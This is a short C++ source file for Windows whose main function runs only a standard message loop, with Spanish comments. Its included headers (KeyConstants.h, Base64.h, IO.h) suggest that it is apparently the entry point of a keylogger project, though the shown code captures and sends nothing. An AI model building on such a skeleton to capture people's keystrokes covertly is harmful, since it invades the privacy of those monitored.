
#include <iostream>
#include <windows.h>
#include "Base64.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "IO.h"

using namespace std;

int main()
{
    MSG mensaje;
    while(GetMessage(&mensaje,NULL,0,0))
    {
        TranslateMessage(&mensaje); //traducir mensaje
        DispatchMessage(&mensaje); //mostrar mensaje
    }

    return 0;
}

